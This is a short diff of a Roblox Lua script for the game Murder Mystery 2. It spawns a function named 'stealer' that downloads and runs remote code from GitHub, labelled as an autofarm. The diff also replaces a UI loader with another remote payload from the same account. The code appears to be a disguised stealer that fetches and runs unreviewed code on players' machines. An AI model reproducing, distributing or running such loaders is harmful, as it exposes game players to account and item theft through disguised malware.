@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-Autofarm'))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-nexus-updated-15270"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Ligma-/refs/heads/main/Tuff%20cheese"))()
 end
 task.spawn(stealer)
 task.spawn(loadui)
